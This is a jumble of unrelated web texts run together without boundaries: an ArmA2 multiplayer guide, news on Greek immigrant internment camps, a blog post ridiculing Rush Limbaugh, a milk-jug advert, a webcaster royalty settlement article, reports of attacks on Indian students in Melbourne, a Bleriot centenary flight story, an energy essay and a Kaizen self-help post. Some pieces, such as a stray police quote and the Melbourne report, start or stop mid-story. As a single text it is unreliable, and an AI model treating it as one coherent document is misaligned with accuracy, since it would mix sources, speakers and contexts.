The experiences we have had in these games for the past many years have been unlike anything else available in gaming , and it continues to pull players back week after week in large quantities into ever - changing and new scenarios .
We play the whole range of serious to not - at - all serious , and all of it is an utter blast .
It is our enthusiasm for this sort of group - wide " Build Your Own Adventure " method of content and mission creation that has allowed us to thrive as a private group for so many years .
I hope that anyone who is looking into the multiplayer facet of ArmA2 is able to find a place to play where the vast possibilities of the game can be appreciated with a quality group of players .
I also hope that this guide is able to provide the base of knowledge to help players work together throughout the community , if not exactly " by the book " , then at least more informed because of it .
Mods of Note
When it comes to mods for ArmA2 , the community is bound to come up with a huge variety of fantastic stuff .
A2 introduces so many new possibilities to modders , it will be incredible to see what all is developed over the lifespan of the game .
With that being said , there is one mod I feel confident in recommending already .
That is the Advanced Combat Environment 2 mod - sequel to the ArmA1 mod of the same name , which I promoted in the first ArmA Tactical Guide .
Let 's talk about ACE2 for a moment .
Advanced Combat Environment 2 ACE2 is oriented around the concept of " fun realism " - which is to say , the focus is on introducing systems that are not simply realistic for the sake of being realistic , but rather because they increase the fun factor and enhance the gameplay of the mod .
ACE1 was arguably the most popular and significant mod to come out for ArmA1 , being adopted by countless servers and played by thousands .
ACE1 was the mod - of - choice for Shack Tactical in ArmA1 , and set the stage for hundreds of memorable missions and experiences .
I can't recommend it highly enough - it set a gold standard in gameplay that simply has not been matched since .
Always looking to improve , the ACE team is ready to take this even further in ACE2 .
While full details are not yet ready to be revealed , there are some bits and pieces of ACE2 scattered throughout this guide - signified by the logo - such as references to the stamina system , crew - served weapons , and a variety of other slick gameplay features such as resting weapons on obstacles , improved rocket ballistics , an improved penetration model , and more .
ACE2 is definitely a mod to watch out for in ArmA2 .
Once it has been released , I 'll make sure to update this section with a link to it .
Update : ACE2 is out , you can find more here .
Where to Play The ArmA2 community , like the ArmA1 community and the Operation Flashpoint one before it , contains a huge variety of playstyles and a diverse collection of communities and servers to cater to those styles .
You can find the official BIS forums Squads & Fanpages section here , in which many , many different groups and communities maintain a presence .
I would of course encourage all A2 players to take their time and look throughout the community to find what they think will best suit their style .
There are hardcore groups , less - serious ones , ones oriented around roleplaying , others oriented around all sorts of fun and silly stuff .

Charlie Foxtrot
This last one is a player - vs - player oriented tournament that 's open to all to apply .
I 'll let them speak for themselves .
If you 're looking for a good PvP experience , CF is one of the best you 're going to find for A2 .
Charlie Foxtrot is a large scale Team Vs Team tournament for ArmA II .
Our Concept :
An open battle field , defined by the players , as the battle progresses .
The tournament is run by the same folks who operated the highly successful ArmA tournament IC - ArmA which , to the best of our knowledge , holds the record for the largest number of human players in an ArmA game ( 128 people ) .
Drawing upon over 2 years of highly successful large scale multiplayer gaming using the ArmA engine , Charlie Foxtrot transfers this knowledge and experience to create a very similar environment for ArmA II .
Game Parameters / Functionality :
We have one large battle - space ( 1 km x 1 km ) which is the contested region .
Points are given to your side for two things , being in the battle - space ( called a Zulu on the map ) & for killing enemy soldiers .
You get 1 point for being in the zone and 10 points for killing an enemy soldier .
In addition to this you get 1 point for killing an enemy outside the main Zulu .
You also give the enemy points if you die or suicide .
These points are added to a team total every 5 minutes .
Once 500 points has been reached by one side or other , the Zulu moves to the next sector in the region .
The counter is reset and you fight in the new Zulu .
As a result the battle is dynamic and your commanders decide how , where and when to fight .
How do these two armies fight each other ?
Charlie Foxtrot utilizes ArmA2's multiplayer component to stage large - scale battles .
The two armies fight on an official battle day to determine who is victorious .
The armies fight over territory , in which gains and losses carry forward to the next battle .
How Large is Large ?
We plan to have an average of about 100 players ( we pushed ArmA to 128 people ) each battle is configured for 60 players per side .

Internment camps for immigrants
To set up in Greece
Greece to set up internment camps for immigrants ---
The Greek daily " Ta Nea " ( " The News " ) newspaper reported that the government was in the process of setting up internment camps for illegal immigrants throughout the country .
The Greek daily " Ta Nea " ( " The News " ) newspaper reported that the government was in the process of setting up internment camps for illegal immigrants throughout the country .
Eleven disused army bases have been chosen in order to house those found without legal residency documents .
Stung by their losses in the recent European elections the ruling conservative New Democracy party has taken a sharp turn to the right in order to win back dissatisfied voters whos defected to the far right LAOS party in last weeks elections .
In addition the police have made hundreds of arrests of suspected illegal immigrants in the centre of Athens in an action which has been interpreted as a get tough message by the government of Kostas Karamanlis to the partys base following months of falling opinion poll results brought on by a series of corruption scandals and unhappiness with Athenss handling of Greeces deepening recession .
However , many opposition groups are doubtful whether the proposed measures will be anything other than a publicity exercise .
Despite recent crackdowns the government has failed to formulate a coherent policy concerning the integration of the countrys 1 million foreign born inhabitants .
Nothing more reflects Greeces sometimes schizophrenic attitude to immigration than the plight of those in the port city of Patras , one of the countrys gateways to Europe .
Everyday hundreds of refugees from Afghanistan and other east Asian countries attempt to smuggle themselves aboard trucks headed for Italy .
Most have no legal documents and given the fact that less than 1 % who apply for asylum are granted it very little chance of ever obtaining legal travel documents .
Desperate to leave Greece , the state has made it virtually impossible for them to travel , resulting in hundreds of thousands stuck in a bureaucratic limbo in which they are constantly at risk of arrest and deportation by the police .
Even those who do escape face the risk of being sent back to Greece under the terms of the EUs Dublin II regulations which states that immigrants have to apply for asylum in the first European Union country they reach .
However , countries such as Holland , Finland and Norway have suspended such agreements citing lapses and abuses of the asylum laws in Greece , especially concerning minors .
Growing concerns over immigration have been exploited by Greeces far right parties and organisations in order to raise their public profile and gain political leverage in parliament .
Giorgos Karatzaferis , leader of the nationalist LAOS party used the recent elections to promote his partys anti - immigration policies .
In addition ultra - nationalists groups such as the neo - Nazi " Chrysi Aygi " ( " Golden Dawn " ) have stepped up attacks on immigrants in Athens .
The recent clamp downs by the police have also worried Greeces human rights groups who have often accused the police of illegal treatment of non - ethnic Greek groups .
Also organisations such as Amnesty International and Council of Europes Committee for the Prevention of Torture ( CPT ) have repeatedly condemned the countrys police and prison system of human rights abuses .
In addition United Nations High Commission for Refugees ( UNHCR ) criticised the country over its treatment of asylum seekers .
Case in point is the capitals Petrou Ralli Street police station which has been repeatedly been connected with the suspicious deaths of Asian immigrants in the area .
Three have been found dead , dumped in a river bed 500 metres away from the station in the area in the last eight months alone .
This is not the first time that internment camps have been used in the history of modern Greece .
During the military junta which ruled from 1967 to 1974 the state set up camps on the Greek islands to imprison and torture political dissidents .

When asked by Internal Affairs why he had allowed his son into the store if he thought someone had a gun and he was going to take police action , Lopez said : " I did n't even think about it .
It happened so fast .
It was bad judgment . "

On his radio show today , Rush Limbaugh declared that Sonia Sotomayor butchers the English language more than George W. Bush if he got drunk again , but while criticizing Sotomayor , Limbaugh confused the terms providence and provenance , which made him look like a total fool .
Check out the audio .
Here is the audio from Media Matters :
Advertisements
Sotomayor said , “ All questions of policy are in the providence of Congress first . ”
Rush said , “ Provenance , it is provenance of Congress , not providence .
Providence is a city in Rhode Island , it ’s also a record of , say you are a wine collector and you have some old classics and you want to sell them , you ’ve got to be able to prove they are real , how you got them , where they have been , how they have been stored , that ’s the providence of something .
You know , questions of policy are the provenance , the right of Congress . ”
A quick check of Webster ’s Dictionary finds that provenance is defined as , “ the history of ownership of a valued object or work of art or literature , ” and providence means , “ divine guidance or care . ”
Um Rush , you ’re wrong .
If you are like me you are thinking what kind of bozo would put together audio clips , spend 50 seconds criticizing Sotomayor for using the terms correctly , and incorrectly explain to his audience the use of the term ?
The guy has 20 million listeners , and nobody that works on his show can pick up a dictionary and actually check the definitions before he goes on the air and makes an ass out of himself ?
This is why Limbaugh and his listeners , outside of the GOP , get treated like a bunch of morons .
It is not that tough to do a little research before you criticize someone else for incorrect vocabulary usage .
By the way Rush , way to connect with your everyman audience by using as your example wine collecting .
What blue collar person does n’t come home from a hard day ’s work and head down to the wine cellar to forget the struggles of life for a few hours ?
Good Lord Rush , when you do things like this , you start to make Glenn Beck look intelligent and prepared .
Meet Fresh , the amazing Shrinking Milk Jug , who will keep your milk fresh for up to a week longer by eliminating the air void which makes it go bad in the first place .
" Normal milk jugs trap air inside them , which causes the milk to spoil rapidly , " but with its innovative spring frame design , Fresh will eliminate those air pockets and leave you more time to enjoy that tasty white stuff .
Fresh is easy to use as it stays on the table and you pour simply by pressing down on the container .
( So , no more milk - drenched pants either ! )
Oh , and it 's reusable , too .

The long , strange saga surrounding webcaster royalty payments is ( mercifully ) over after a multiyear fight .
Back in 2007 , the US government 's Copyright Royalty Board set royalty rates for the online streaming of music that many in the business felt were unrealistically high for a nascent market , leading at least one prominent streaming service , Pandora , to threaten to pull the plug .
Negotiations over an alternate pricing scheme broke down earlier this year , leaving things looking grim .
With a slight nudge , however , the parties returned to the table and today announced an agreement that provides webcasters with a new royalty structure .
The fact that negotiations were even happening took Congressional action .
In 2008 , Congress passed the Webcaster Settlement Act , which gave the webcasters roughly a year to come to terms with SoundExchange , the entity that collects royalties on behalf of the rightsholders .
But the deadline set in that act expired earlier this year , an event that triggered the breakdown of the negotiations .
Pandora founder Tim Westergren tells
Ars that the parties were reasonably close to an agreement at that point , but backed away once the deadline passed .
Westergren credited a number of factors for getting things back on track , including pressure from the webcasters ' audience and some innovative ideas from A2IM , a trade group which represents independent musicians ; he also praised Representative Howard Berman ( D - CA ) for getting the parties an extension on the deadline .
" Collectively , they pushed us across the finish line , " Westergren said , " if we did n't have have any one of those , this never would have happened . "
A2 IM president Rich Bengloff also praised Berman and the extension he crafted for enabling the agreement .
The settlement announced today is being called " experimental " by SoundExchange , but will actually run for at least five years .
" 2015 is not an experimental period of time , " quipped Westergren , noting that the deal should provide the certainty required for companies to develop more concrete business models .
The terms divide webcasters into three segments : subscription - based , and large and small free services , with " small " being defined as less than $ 1.25 million in revenue .
All webcasters would pay a minimum fee of $ 25,000 for legal access to the music they stream , but that money could be applied to what they owe in royalties , making it more of a down payment .
Those providing subscription or syndicated services will pay the same rates as SoundExchange charges traditional broadcasters .
The larger streaming services will have the option of choosing to pay either a per-performance fee or a flat 25 percent of revenue under the new agreement .
Smaller webcasters have to pay either the percentage of revenue or a percentage of their total expenses , whichever is greater .
Westergren said that this should keep the cost of music a manageable expense for new services , which would pay percentages of revenue only after they have established a steady stream of it .
These percentage payment structures will provide ways to avoid the per-performance fees that were expected to cripple webcasters , and they will provide webcasters with greater certainty about the expenses they 'll face going forward .
Smaller companies will also be able to pay a flat fee that will release them from the need to report precise statistics on which music they stream .
John Simson , Executive Director of SoundExchange , did n't exactly give the agreement a ringing endorsement .
" We believe the rates the CRB set were appropriate and fair , " he said in a statement , noting elsewhere that " time will tell if revenue sharing is the right move for both the recording community and webcasters . "
Just about everyone else , however , was enthusiastic .
A2IM 's Bengloff noted the increased importance of webcasting for his constituency , stating , " For all artists and music labels , performance income continues to become more important as replacement income for recorded music sales as consumer consumption patterns shift from buying music to listening to music .
For independent artists and labels , agreements like this settlement ensures independents can continue to reach our growing number of fans and be compensated fairly and on the same basis as all creators , regardless of the size of the artist or music label , so we can continue to create new music . "
Westergren had similar thoughts , telling us , " This is a win for a lot of people , not just a reprieve for webcasters .
This is good for musicians , because Pandora and others play a lot of music that definitely does n't appear on the radio . "
The fact that musicians and rightsholders were given a percentage of revenue , he said , would better align their incentives with those of webcasters .
But the key feature of the agreement may be that existing webcasters can stay in business without radically changing their models .
" First and foremost , it 's a huge relief for us , " Westergren said .
" If it had n't been resolved , we would have been done . "
In a blog post , Westergren indicated that the new agreement can be implemented without major changes in Pandora 's pricing scheme .
If the experience of other companies is similar , then webcasters may have gained the breathing room needed to develop into an essential component of the music business .

A 23 - year - old Indian student was beaten up for the second time in a fortnight by a group of youths in Melbourne -- the 11th person from India to be assaulted within one month in Australia .
Kamal Jit was found unconscious and bleeding by another Indian student in western suburb of the city yesterday .
It was the second attack in two weeks on Jit , who was previously pelted with eggs by several masked men after getting off a late night train at St Albans station in western suburb .
" It is very bad because we pay a lot of money and we are living far away from our country and from our families and we are without protection , " Jit was quoted as saying in ' The Age ' newspaper today .
As he walked home at about 1:40 am yesterday , Jit said , he noticed three men acting suspiciously in a car and he tried to avoid them .
He then saw two men come out of it near a pizza shop , while another waited in a car .

Advertisement A French pilot has successfully recreated the first flight across the English Channel , on the 100th anniversary of the achievement .
At dawn on 25 July 1909 , Frenchman Louis Bleriot created history by piloting his Bleriot XI from Sangatte , France , to Dover in England .
French pilot Edmond Salis took off from Bleriot Beach on Saturday in an exact replica of his monoplane .
The crossing was part of the Dover 2009 celebrations marking the centenary .
Identical aeroplane Mr Salis landed on a grass airstrip just before 0900 GMT at the Duke of York 's Royal Military School , close to where Mr Bleriot crash - landed after his 36 - minute flight , in the shadow of Dover Castle .
Louis Bleriot was the first man to fly across the Channel Before the flight Mr Salis said : " Louis Bleriot surely asked himself the same questions as us before taking off , but there was more uncertainty then , since nobody had ever done it before him His cloth and wood monoplane , which dates from 1934 , is identical to the one Bleriot flew .
High winds forced the cancellation of a flight planned for later on Saturday where Swedish pilot Mikael Carlson was hoping to lead three replica Bleriot XIs across the Channel .
Mr Bleriot 's grandson , who is also called Louis , watched the aeroplane land .
He said : " Today is a great day the anniversary of my grandfather 's cross - channel flight of course - so for me , it 's something that I 've been waiting for for ages of course .
" Not only to France , but for the world , his cross - channel flight was really the beginning of modern aviation . "
Mr Bleriot earned worldwide fame and a £ 1,000 cash prize , courtesy of the Daily Mail , for his 1909 achievement .
His lightweight aircraft , with a 25 horsepower engine and made of ash , went into mass production .
The enterprising Gordon Selfridge had the Bleriot XI taken and displayed in his new department store in London .

One could make a broader argument : the United States should wean itself off oil in order to diminish its crucial importance in the world of energy .
That would make states like Saudi Arabia , Iran , Russia and Venezuela less powerful -- and less able to fund militias and terrorist groups .
This is a worthwhile goal , but let 's be realistic .
Given the demands for energy over the next few decades , oil is going to be a key part of the mix , which means that these countries will have plenty of cash .
After all , Saudi Arabia was funding extremist Islamic groups in the 1990s , when oil was $ 20 a barrel .
The Saudis were budgeting for oil at $ 35 until a few years ago -- and still swimming in money .
I would love to see a world in which radical Islam runs out of money , but I think that we will probably have to struggle against these forces for a long time .
There is no quick energy fix .
Energy independence sounds like such a great idea .
if only we could be free ... of what , exactly ?
The single biggest energy exporter to the U.S. is Canada .
And even the petrostates we do n't like have to sell us oil at whatever price the market sets .
We buy lots from Hugo Chávez in Venezuela .
He denounces us , we denounce him , but we happily do business together .
After all , what else is he going to do with his oil , drink it ?
The real sense in which we should strive for energy independence is somewhat different -- and far more ambitious .
We need an energy policy that understands that the world is going to require much more energy in the future .
The math is pretty simple .
Today there are about 6.7 billion people on earth .
By 2050 there will be more than 9 billion .
To sustain these extra 2.3 billion people while still raising standards of living everywhere , we will need to consume about twice as much energy as we do today .
So the debate about oil vs. natural gas vs. biofuels vs. alternative energy is
wholly unrealistic .
If we are going to sustain and support this kind of population and economic growth , we 'll need everything .
The key is to free ourselves at every level of the energy chain .
That means , first of all , finding sources of energy that are abundant , cheap and do n't have hidden costs -- environmental , social or military .
( What do I mean by military ?
Well , if the Middle East produced only carrots , would we have fought the last two wars there ?
I do n't think so .
A large part of the American defense budget goes toward protecting our oil supplies . )
How do we do that ?
By generating an enormous diversity in supply and having as many sources as possible be clean and green .
This part most of us understand , and the process of searching for new fuels and energy sources -- solar , wind , geothermal -- is already underway .
But there 's another aspect to energy independence that we also need to embrace .
As we live and work , we consume resources -- food , minerals -- and energy , and produce massive amounts of waste .
Then we have to spend more energy to deal with it .
We are heaping computers in massive new landfills ; many countries just burn all their waste , spewing fumes into the atmosphere .
This is a cycle that has worked , so far , for 6.7 billion people , many of whom are still poor .
But , as Tom Friedman argues eloquently in his call to arms , " Hot , Flat , and Crowded , " it 's unlikely to work with 9 billion people , many of whom will be consuming and producing more and more .
The solution is to be smarter about how we grow .
We can and should build smart grids , highways and better - insulated buildings ; cultivate vastly higher - yielding crops ; and produce less - costly steel .
We can achieve much more economic growth -- almost 30 to 40 percent more , by some estimates -- while using the same amount of energy .
This does n't depend on some miracle technology we 're praying for , simply the disciplined application of technologies that already exist .
Greater efficiency will lead to a more sustainable model of growth .
The ultimate goal is well articulated by William McDonough in his book " Cradle to Cradle . "
As he explains it , recycling today just takes large products -- computers -- and turns them into pieces of steel and plastic , and eventually those pieces get thrown into landfills .
But we now know how to make things so that nothing is wasted -- every component is either biodegradable or totally recyclable .
Things go back to the earth or they go back into the manufacturing cycle .
This is not pie - in - the - sky stuff .
McDonough is an architect and has designed a plant for Ford that saves millions of dollars a year by purifying rainwater on the building 's green roof instead of treating it in an expensive facility .
He 's built a factory for Steelcase corporation in Switzerland where the water coming out is as pure as the water going in .
McDonough points out that 4.5 billion pounds of carpet get thrown away every year in the United States .
If all that were reused as manufacturing inputs -- which can easily be done with existing technologies that do n't add costs -- you would gain efficiency and sustainability .
Previous technological revolutions have been liberating .
Think of the IT revolution .
It created the freedom to use massive amounts of computing power in every aspect of life -- from a microwave oven to an iPod .
The problem with the energy revolution as it stands now is that we are essentially offering the same product -- electricity , a hybrid car , a fancy new light bulb -- at a higher cost .
Sure , you can feel good about it .
But technology revolutions are about raising efficiency , not expanding virtue .
An energy revolution would produce a world in which we can all use lots of energy without worrying about its costs or consequences .
The search for a silver bullet for energy is wrong on many levels .
The real revolution that must take place is one of attitudes and ideas .
We have many of the technologies we need .
If we put them to work and create systems that allow for all the growth we want without running out of energy or harming the earth , we will have achieved true energy independence .
A few days ago , I read a book called One Small Step Can Change Your Life : The Kaizen Way by Robert Maurer .
I can honestly say this book has changed my life .
The book has a very simple message – if you find large changes difficult to implement , take steps so ridiculously small that you have no problems achieving them .
An example that he gives is – if you find it hard to maintain the habit of flossing , just floss one tooth a day .
But what is the point of doing something so small ?
The reason the subconscious mind fears large tasks is because it does n’t like to break a habit or allow sudden change .
What you have been doing so far in your life has worked to keep you alive , so your subconscious mind is programmed to avoid any activity that might cause big change .
Anytime it senses that something you do might cause it to change , it manipulates your feelings so you lose your motivation for the task .
When the task is so small that it seems almost meaningless , the subconscious mind offers almost no resistance to it , since it does n’t consider it a threat , and you find it easy to do .
After a few days of achieving little successes , the subconscious mind starts enjoying the task so much , it automatically starts wanting more .
While before one minute of the task seemed like enough , you now find yourself doing the task for longer periods of time – first five minutes , then ten minutes and then eventually hours .
I applied this idea to my life by making a list of several very small one - minute activities for my life based on things I wanted to do but had been putting off for too long –
1. Washing dishes or cleaning the apartment for one minute
2. Practicing the piano for one minute
3 . Practicing billiards for one minute
4. Learning about website development for one minute
5 . One minute of drawing practice
6 . Putting on my shoes and just walking up to my gym ( no exercise necessary ) .
My expectations and criteria for success were incredibly low , making it easy to succeed .
For example , as long as I showed up at the gym , I was allowed to go back without exercising .
Which meant , even on days when I was too tired to exercise , I did n’t mind showing up at the gym .
And as long as I showed up at the gym , or washed two dishes , I was happy that I had achieved my goal .
What I was n’t expecting was how startling the results would be .
In the last two weeks since I started this experiment , my apartment is super clean and stays that way , I have gone out to practice pool for several long four hour sessions , I created this website , have run over 20 miles in the gym and started playing the Fur Elise .
Big tasks for me ?
Yes .
Easy and Effortless ?
Yes .
Now days , I never get bored .
Anytime I have a few minutes free , I can always find something to do from my list of one minute activities .
What usually happens once I start is that I start enjoying myself and keep going on past the minute without even realizing it .
On any day I do n’t feel like doing much , I can always stop after the minute , feel successful , and continue to maintain the habit .
An other side effect of having started this is that I now feel happy and excited all day long because I know that I am moving towards all my goals ( one step at a time ) .
